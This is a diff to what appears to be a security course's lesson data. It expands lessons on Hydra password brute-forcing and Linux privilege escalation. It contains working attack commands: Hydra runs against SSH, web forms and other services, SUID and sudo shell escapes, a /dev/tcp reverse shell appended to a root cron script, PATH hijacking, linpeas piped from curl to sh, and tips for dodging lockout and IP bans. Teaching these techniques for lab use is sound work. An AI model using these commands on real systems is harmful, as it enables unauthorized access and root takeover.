@@ -1249,115 +1249,200 @@ Crack a set of sample MD5 and NTLM hashes using both John and Hashcat. Compare t
         type: 'practice',
         duration: '2 hours',
         content: `:::objectives
+- Understand the different types of password attacks
 - Perform brute-force attacks against HTTP, SSH, and FTP with Hydra
-- Select appropriate wordlists for brute-force attacks
-- Understand rate limiting and account lockout countermeasures
+- Select appropriate wordlists and understand rate limiting countermeasures
 :::
 
 :::warning
 All brute-force techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test. Brute-forcing unauthorized systems is illegal.
 :::
 
-## Hydra Overview
+## What Is a Brute Force Attack?
 
-Hydra is a fast online password brute-force tool supporting many protocols.
+A brute force attack tries every possible password until one works. But "brute force" is actually a category with several subtypes:
 
-### Basic Syntax
+| Attack Type | How It Works | Speed | Example |
+|-------------|-------------|-------|---------|
+| **Dictionary** | Tries passwords from a wordlist | Fast | rockyou.txt, SecLists |
+| **Brute Force** | Tries every character combination | Slow | aaaa, aaab, aaac... |
+| **Hybrid** | Combines dictionary + rules | Medium | password1, password!, Password1 |
+| **Credential Stuffing** | Uses leaked username:password pairs | Fast | Data breach dumps |
+
+**Why dictionary attacks are most common:** A 8-character password has 218 trillion possible combinations. Even at 1 billion guesses/second, that's 69 years. A dictionary attack tries the 14 million most common passwords first — and usually finds one in minutes.
+
+## Online vs Offline Attacks
+
+This is the most important concept in password cracking:
+
+**Online attacks** (what Hydra does):
+- Try passwords against a LIVE service (SSH, HTTP, FTP)
+- Speed limited by network latency and service response time
+- Subject to account lockout, rate limiting, IP banning
+- Speed: ~100-1000 guesses/second
+- Use when: You have network access to the target service
+
+**Offline attacks** (what Hashcat/John do):
+- Crack password HASHES you've already obtained
+- No network required — all computation is local
+- No lockout — try as fast as your hardware allows
+- Speed: ~10 billion guesses/second (GPU)
+- Use when: You've dumped a database, stolen /etc/shadow, or captured a hash
+
+**The key difference:** Online attacks are slow and detectable. Offline attacks are fast and silent. Always prefer offline when possible — get the hash first, crack it later.
+
+## Why Protocol Choice Matters
+
+Different services have different authentication mechanisms. This affects how you attack them:
+
+| Protocol | Authentication | Lockout Risk | Speed |
+|----------|---------------|-------------|-------|
+| SSH | Username + password | Medium | ~50/sec |
+| HTTP POST | Form-based | High (often has CAPTCHA) | ~100/sec |
+| FTP | Username + password | Low | ~100/sec |
+| SMB | Username + password + domain | Medium | ~50/sec |
+| MySQL | Username + password | Low | ~100/sec |
+| RDP | Username + password + NLA | High (often has lockout) | ~20/sec |
+
+**What this means:** SSH brute force is slow but reliable. HTTP brute force is fast but often blocked. FTP is easy but less common. Choose your target based on what's available and what defenses exist.
+
+## Tool: Hydra
+
+Hydra is the standard online brute-force tool. It supports 50+ protocols and is optimized for speed.
+
+**Basic syntax:**
+
 \`\`\`bash
 hydra -l <username> -P <password_list> <target> <service>
 \`\`\`
 
-## HTTP Post Form Brute Force
+| Flag | Description |
+|------|-------------|
+| \`-l\` | Single username |
+| \`-L\` | Username list file |
+| \`-p\` | Single password |
+| \`-P\` | Password list file |
+| \`-t\` | Parallel tasks (default 16) |
+| \`-f\` | Stop after first valid credentials |
+| \`-v\` | Verbose output |
+| \`-V\` | Show each attempt |
+| \`-s\` | Custom port number |
+
+## Attack: SSH Brute Force
+
+SSH is the most common target for brute force — it's exposed on most servers and rarely has CAPTCHA.
 
 \`\`\`bash
-# Brute-force a login form
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+# Single username, password list
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
 
-# With cookies
+# Username list, password list
+hydra -L users.txt -P passwords.txt 192.168.1.100 ssh
+
+# Custom port, stop after first find
+hydra -l admin -P wordlist.txt -f -s 2222 192.168.1.100 ssh
+\`\`\`
+
+**What happens:** Hydra opens multiple SSH connections in parallel, tries each password, and reports when one succeeds.
+
+## Attack: HTTP Login Form Brute Force
+
+Web login forms are common targets. The syntax is more complex because you need to tell Hydra what to POST and how to detect failure.
+
+\`\`\`bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+\`\`\`
+
+**Breaking down the http-post-form syntax:**
+
+\`\`\`
+"/login:username=^USER^&password=^PASS^:F=incorrect"
+\`\`\`
+
+| Part | Meaning |
+|------|---------|
+| \`/login\` | The URL path to POST to |
+| \`username=^USER^\` | POST parameter — \`^USER^\` replaced by username |
+| \`password=^PASS^\` | POST parameter — \`^PASS^\` replaced by password |
+| \`F=incorrect\` | Failure string — response containing this means login failed |
+
+**Why F= matters:** Hydra needs to know what a FAILED login looks like. If the response contains "incorrect", it's a failure. If it doesn't, the login succeeded.
+
+**With cookies (for session-based auth):**
+
+\`\`\`bash
 hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:H=Cookie: session=abc123:F=Login Failed"
 \`\`\`
 
-:::concept
-The http-post-form format: \`"path:post_data:failure_string"\`
-- \`^USER^\` is replaced with the username from -l or -L
-- \`^PASS^\` is replaced with each password from -P
-- \`F=\` is the string that appears on failed login
-:::
+## Attack: FTP Brute Force
 
-## SSH Brute Force
-
-\`\`\`bash
-# Brute-force SSH with a username
-hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
-
-# Brute-force SSH with a username list
-hydra -L users.txt -P passwords.txt 192.168.1.100 ssh
-\`\`\`
-
-## FTP Brute Force
+FTP is straightforward — no complex syntax needed.
 
 \`\`\`bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ftp
 \`\`\`
 
-## Other Supported Services
+## Attack: Other Services
 
 \`\`\`bash
-# SMB
+# SMB (Windows file sharing)
 hydra -l administrator -P passwords.txt 192.168.1.100 smb
 
-# MySQL
+# MySQL database
 hydra -l root -P passwords.txt 192.168.1.100 mysql
 
-# RDP
+# RDP (Remote Desktop)
 hydra -l administrator -P passwords.txt 192.168.1.100 rdp
 \`\`\`
 
-## Useful Hydra Flags
+## Wordlists — Your Ammunition
 
-| Flag   | Description                                   |
-|-------|-----------------------------------------------|
-| \`-l\`   | Single username                                |
-| \`-L\`   | Username list file                             |
-| \`-p\`   | Single password                                |
-| \`-P\`   | Password list file                             |
-| \`-t\`   | Number of parallel tasks (default 16)          |
-| \`-f\`   | Stop after first valid credentials found       |
-| \`-v\`   | Verbose output                                 |
-| \`-V\`   | Verbose showing each attempt                   |
-| \`-s\`   | Custom port number                             |
+The quality of your wordlist determines your success. Don't just use rockyou.txt for everything.
 
-\`\`\`bash
-# Stop after first find, custom port, verbose
-hydra -l admin -P wordlist.txt -f -s 8080 -V 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
-\`\`\`
+| Wordlist | Location (Kali) | Size | When to Use |
+|----------|-----------------|------|-------------|
+| fasttrack.txt | /usr/share/wordlists/ | 22K | Quick scan, common passwords |
+| rockyou.txt | /usr/share/wordlists/ | 14M | Standard attack |
+| SecLists | /usr/share/seclists/ | Various | Targeted attacks |
+| Custom | You create it | Varies | When you know the target |
 
-## Wordlists
-
-| Wordlist | Location (Kali)                          | Size    |
-|---------|------------------------------------------|---------|
-| rockyou.txt | /usr/share/wordlists/rockyou.txt      | ~14M    |
-| SecLists | /usr/share/seclists/                     | Various |
-| fasttrack | /usr/share/wordlists/fasttrack.txt      | ~22K    |
+**Wordlist strategy:**
+1. Start with fasttrack.txt (22K passwords, tests the most common ones)
+2. If that fails, try rockyou.txt (14M passwords, covers most common)
+3. If that fails, try SecLists (targeted by service, country, etc.)
+4. If that fails, create a custom wordlist based on target info
 
 :::tip
-For initial brute-force, start with fasttrack.txt (small, common passwords). If that fails, move to rockyou.txt (larger, comprehensive).
+For initial brute-force, start with fasttrack.txt (small, common passwords). If that fails, move to rockyou.txt (larger, comprehensive). Never start with the biggest wordlist — it wastes time.
 :::
 
-## Rate Limiting and Lockout
+## Defenses — What You'll Encounter
+
+Understanding defenses helps you plan your attack:
+
+**Account lockout:** After N failed attempts, the account is locked. Countermeasure: use \`-t 1\` (one attempt at a time) or switch to a different username.
+
+**Rate limiting:** The service delays responses after failed attempts. Countermeasure: reduce parallel tasks (\`-t 4\`) or add delays between attempts.
+
+**IP banning:** The service blocks your IP after N failed attempts. Countermeasure: rotate proxies or use a slow attack.
+
+**CAPTCHA:** Requires human interaction. Countermeasure: no automated bypass — move to a different vector.
+
+**Fail2ban:** Monitors logs and bans IPs with too many failed attempts. Countermeasure: check \`/var/log/fail2ban.log\` for ban duration.
 
 :::warning
-Many systems implement account lockout after failed attempts. Always check your target's lockout policy before brute-forcing. In a real engagement, coordinate with the client.
+Many systems implement account lockout after failed attempts. Always check your target's lockout policy before brute-forcing. In a real engagement, coordinate with the client. Getting locked out during a pentest is embarrassing.
 :::
 
+**Reducing detection:**
 - Reduce parallel tasks: \`-t 4\` (slower but less likely to trigger lockout)
 - Use targeted wordlists instead of massive ones
 - Monitor for lockout indicators in output
+- Space out attacks over time
 
 :::checkpoint
-Set up a local SSH server and brute-force it with Hydra using rockyou.txt. Time the attack and note the speed. What happens if you reduce -t to 2?
-:::
-`,
+Set up a local SSH server and brute-force it with Hydra using rockyou.txt. Time the attack and note the speed. What happens if you reduce -t to 2? What happens if the server has Fail2ban installed?
+:::`,
         aiPrompt: '',
         labUrl: '',
         labTitle: '',
@@ -1497,8 +1582,8 @@ Set up a local SSH server and brute-force it with Hydra using rockyou.txt. Time 
         type: 'learn',
         duration: '2 hours',
         content: `:::objectives
-- Enumerate key Linux system information for escalation vectors
-- Identify and exploit SUID binaries, sudo misconfigs, and cron jobs
+- Understand how Linux permissions and privilege levels work
+- Identify SUID binaries, sudo misconfigs, cron jobs, and kernel exploits
 - Use automated tools like LinPEAS for comprehensive enumeration
 :::
 
@@ -1506,120 +1591,237 @@ Set up a local SSH server and brute-force it with Hydra using rockyou.txt. Time 
 All techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test.
 :::
 
-## Enumeration Commands
+## How Linux Permissions Work
+
+Every process on Linux runs with a **UID** (User ID) and **GID** (Group ID). When you type a command, the process inherits YOUR UID. The kernel checks permissions based on three levels:
+
+- **Owner (u):** The user who owns the file
+- **Group (g):** Users in the file's group
+- **Others (o):** Everyone else
+
+Each level has three permissions:
+- **Read (r):** View file contents or list directory
+- **Write (w):** Modify file or create/delete files in directory
+- **Execute (x):** Run file as a program or enter directory
+
+When you run \`ls -la\`, you see this:
 
 \`\`\`bash
-# System information
-id                           # Current user and groups
-uname -a                     # Kernel version
-cat /etc/os-release          # OS distribution
-hostname                     # System hostname
-
-# User information
-whoami                       # Current username
-whoami /priv                 # (Windows equivalent)
-sudo -l                      # What the user can run as root
-cat /etc/passwd               # All users on the system
-cat /etc/shadow               # Password hashes (requires root)
-
-# Network information
-ip addr                      # Network interfaces
-ip route                     # Routing table
-ss -tlnp                     # Listening ports
+-rwxr-xr-x 1 root root 8840 Jul  7 10:00 script.sh
 \`\`\`
 
-## SUID Binaries
+Breaking it down:
+| Position | Permission | Meaning |
+|----------|-----------|---------|
+| \`-\` | File type | Regular file |
+| \`rwx\` | Owner | root can read, write, execute |
+| \`r-x\` | Group | Group members can read and execute |
+| \`r-x\` | Others | Everyone else can read and execute |
 
-SUID (Set User ID) binaries run with the file owner's privileges (often root).
+The **SUID bit** changes this: when set, the process runs with the FILE OWNER's UID, not yours. This is how \`passwd\` works — it's owned by root with SUID set, so it can modify \`/etc/shadow\` even when you run it as a regular user.
+
+## The Privilege Escalation Mindset
+
+Privilege escalation is not about running random commands and hoping something works. It follows a methodology:
+
+1. **Enumerate** — Gather system information (OS, kernel, users, services)
+2. **Identify** — Find misconfigurations, vulnerable software, writable files
+3. **Evaluate** — Determine which finding is actually exploitable
+4. **Exploit** — Use the vulnerability to gain higher privileges
+5. **Verify** — Confirm you have root/SYSTEM access
+
+The most common escalation vectors on Linux are:
+- **SUID binaries** — Binaries that run as root
+- **Sudo misconfigurations** — Commands you can run as root without a password
+- **Cron jobs** — Scheduled tasks running as root that you can modify
+- **Writable files** — Files owned by root that you can edit
+- **Kernel exploits** — Vulnerabilities in the Linux kernel itself
+- **Capabilities** — Fine-grained permissions on binaries
+- **Docker group** — If you're in the docker group, you can mount the host filesystem
+
+## Step 1: Enumeration — Know Your Target
+
+Before you can escalate, you need to know what you're working with. Run these commands first:
 
 \`\`\`bash
-# Find all SUID binaries
+# Who are you and what groups do you belong to?
+id
+# Output: uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
+
+# What OS and kernel version?
+uname -a
+# Output: Linux server01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux
+
+# What distribution?
+cat /etc/os-release
+# Output: Ubuntu 22.04.3 LTS
+
+# What's the hostname?
+hostname
+# Output: webserver01
+
+# Who else is on the system?
+cat /etc/passwd | grep -v nologin | grep -v false
+# Output: Shows users with shell access
+
+# What can you run as root?
+sudo -l
+# Output: (user) NOPASSWD: /usr/bin/vim
+\`\`\`
+
+:::tip
+Always check \`sudo -l\` first. If you can run ANY command as root without a password, you've already won.
+:::
+
+## Step 2: SUID Binaries — The #1 Vector
+
+SUID binaries run with the file owner's privileges. If a binary is owned by root AND has SUID set, it runs as root. The dangerous ones are binaries that can:
+- Execute arbitrary commands (find, vim, nmap, python)
+- Read arbitrary files (cat, less, more)
+- Write arbitrary files (tee, cp)
+
+**Find all SUID binaries:**
+
+\`\`\`bash
 find / -perm -4000 -type f 2>/dev/null
-
-# Find SGID binaries
-find / -perm -2000 -type f 2>/dev/null
-
-# Find world-writable files
-find / -writable -type f 2>/dev/null
 \`\`\`
 
-### Exploiting SUID Binaries
-If \`find\` has SUID, you can get a root shell:
+This searches every file on the system for the SUID bit (permission 4000). Most results are legitimate (passwd, sudo, ping). You're looking for unusual ones.
+
+**What to look for:**
+- Custom scripts (often misconfigured)
+- Binaries with known CVEs
+- Binaries listed on GTFOBins
+
+**Exploiting SUID find:**
+If \`find\` has SUID and is owned by root, you can execute arbitrary commands as root:
+
 \`\`\`bash
 find . -exec /bin/sh -p \; -quit
 \`\`\`
 
-If \`vim\` has SUID:
+Why this works: \`find\`'s \`-exec\` flag runs any command. Since \`find\` is running as root (SUID), the shell it spawns also runs as root. The \`-p\` flag preserves the elevated privileges.
+
+**Exploiting SUID vim:**
+
 \`\`\`bash
 vim -c ':!/bin/sh'
 \`\`\`
 
+Why this works: vim can execute shell commands with \`:!\`. Since vim is running as root, the shell it spawns is also root.
+
 :::tip
-Visit GTFOBins (https://gtfobins.github.io/) to look up exploitation methods for any SUID binary you find.
+Visit GTFOBins (https://gtfobins.github.io/) to look up exploitation methods for any SUID binary you find. Search for the binary name, click "SUID", and follow the instructions.
 :::
 
-## Sudo Misconfigurations
+## Step 3: Sudo Misconfigurations — Instant Root
+
+If \`sudo -l\` shows you can run a command as root without a password (NOPASSWD), check GTFOBins for that binary. Common exploitable entries:
+
+| Command | Exploitation Method |
+|---------|-------------------|
+| \`sudo vim\` | \`:!/bin/sh\` or \`:!/bin/bash\` |
+| \`sudo find\` | \`find . -exec /bin/sh \;\` |
+| \`sudo python\` | \`python -c 'import os; os.execl("/bin/sh","sh","-p")'\` |
+| \`sudo nmap\` | \`!sh\` in interactive mode (\`nmap --interactive\`) |
+| \`sudo less\` | \`:!/bin/sh\` |
+| \`sudo awk\` | \`awk 'BEGIN {system("/bin/sh")}'\` |
+| \`sudo perl\` | \`perl -e 'exec "/bin/sh";'\` |
+| \`sudo ruby\` | \`ruby -e 'exec "/bin/sh"'\` |
+
+**Why this works:** sudo runs the command as root. If the command can execute arbitrary commands (vim's \`:!\`, find's \`-exec\`, python's \`os.system\`), you get a root shell.
+
+## Step 4: Cron Jobs — Scheduled Root Commands
+
+Cron jobs run on a schedule. If a cron job runs as root and executes a script you can write to, you can modify the script to execute your commands.
+
+**Find cron jobs:**
 
 \`\`\`bash
-sudo -l
-\`\`\`
-
-If the output shows NOPASSWD for a binary, check GTFOBins for exploitation.
-
-### Common Exploitable sudo Entries
-- \`sudo vim\` → root shell via \`:!sh\`
-- \`sudo find\` → \`find -exec sh \;\`
-- \`sudo python\` → \`python -c 'import os; os.execl("/bin/sh","sh","-p")'\`
-- \`sudo nmap\` → interactive mode → \`!sh\`
-- \`sudo less\` → \`:!sh\`
-
-## Cron Job Exploitation
-
-\`\`\`bash
-# View all cron jobs
+# Your own cron jobs
 crontab -l
-ls -la /etc/cron*
-cat /etc/crontab
 
-# Check for writable cron scripts
+# System-wide cron jobs
+cat /etc/crontab
 ls -la /etc/cron.d/
+ls -la /etc/cron.daily/
 \`\`\`
 
-If a cron job runs a script you can write to, modify it to execute a reverse shell.
-
-## PATH Hijacking
-
-If a cron job or script runs a command without its full path and you can write to a directory earlier in PATH:
+**Check if you can write to cron scripts:**
 
 \`\`\`bash
-echo '/bin/bash' > /tmp/malicious_script
-chmod +x /tmp/malicious_script
+ls -la /etc/cron.d/
+# Look for scripts owned by your user or world-writable
+\`\`\`
+
+**Exploitation:** If you find a writable script that runs as root, modify it:
+
+\`\`\`bash
+echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/to/cron/script.sh
+\`\`\`
+
+**PATH hijacking:** If a cron job runs a command without its full path (e.g., \`backup.sh\` instead of \`/usr/local/bin/backup.sh\`), you can place a malicious script earlier in PATH:
+
+\`\`\`bash
+echo '/bin/bash' > /tmp/backup
+chmod +x /tmp/backup
 export PATH=/tmp:$PATH
 \`\`\`
 
-## Kernel Exploits
+When the cron job runs \`backup\`, it finds yours first.
+
+## Step 5: Kernel Exploits — Nuclear Option
 
 :::warning
-Kernel exploits can crash the system. Only use in lab environments.
+Kernel exploits can crash the system. Only use in lab environments. Never use on production systems.
 :::
 
-- **Dirty COW (CVE-2016-5195):** Affects Linux kernels 2.6.22 through 4.8.3
-- Check kernel version: \`uname -r\`
-- Search for known exploits: \`searchsploit linux kernel 4.x\`
+Kernel exploits target vulnerabilities in the Linux kernel itself. They're powerful but risky — a failed exploit can kernel panic the system.
 
-## LinPEAS Automation
+**Check kernel version:**
 
 \`\`\`bash
-# Download and run LinPEAS
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+uname -r
+# Output: 5.15.0-91-generic
+\`\`\`
 
-# Or transfer from attacker machine
+**Search for known exploits:**
+
+\`\`\`bash
+searchsploit linux kernel 5.15
+\`\`\`
+
+**Notable kernel exploits:**
+| CVE | Name | Kernel Range | Type |
+|-----|------|-------------|------|
+| CVE-2016-5195 | Dirty COW | 2.6.22 - 4.8.3 | Race condition |
+| CVE-2021-4034 | PwnKit | All polkit versions | Memory corruption |
+| CVE-2021-3156 | Baron Samedit | sudo 1.8.2 - 1.9.5p1 | Heap overflow |
+| CVE-2022-0847 | Dirty Pipe | 5.8 - 5.16.11 | Overwrite read-only data |
+
+**Before using a kernel exploit:**
+1. Verify the kernel version matches the exploit requirements
+2. Check if the system has patches installed
+3. Have a backup plan if the exploit crashes the system
+4. Prefer other vectors first (SUID, sudo, cron) — they're safer
+
+## Step 6: LinPEAS — Automated Enumeration
+
+LinPEAS automates the entire enumeration process. It checks dozens of vectors in minutes.
+
+**Download and run:**
+
+\`\`\`bash
+# Transfer from attacker machine
 scp linpeas.sh user@target:/tmp/
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh
+
+# Or run directly from URL
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 \`\`\`
 
-LinPEAS automatically checks for:
+**What LinPEAS checks:**
 - SUID/SGID misconfigurations
 - Writable /etc/passwd
 - Sudo misconfigurations
@@ -1627,11 +1829,31 @@ LinPEAS automatically checks for:
 - Kernel exploits
 - Capabilities
 - Docker group membership
+- Writable sensitive files
+- Network information
+- Running processes
+
+**How to read LinPEAS output:**
+- **Red/Yellow** = High probability exploit vector
+- **Green** = Interesting finding, needs investigation
+- **White** = Informational
 
 :::checkpoint
-Use LinPEAS on a local vulnerable VM. Identify at least 3 potential privilege escalation vectors and attempt to exploit one of them.
+Run LinPEAS on a local vulnerable VM (like VulnHub's DC-1 or Kioptrix). Identify at least 3 potential privilege escalation vectors and attempt to exploit one of them.
 :::
-`,
+
+## Methodology Summary
+
+\`\`\`
+1. id, uname -a, sudo -l           → Know your position
+2. find / -perm -4000               → SUID binaries
+3. cat /etc/crontab                 → Cron jobs
+4. ls -la /etc/cron.d/              → Writable cron scripts
+5. searchsploit linux kernel <ver>  → Kernel exploits
+6. curl linpeas.sh | sh            → Automated enumeration
+\`\`\`
+
+Always try the safest vectors first (sudo, SUID, cron) before resorting to kernel exploits.`,
         aiPrompt: '',
         labUrl: '',
         labTitle: '',
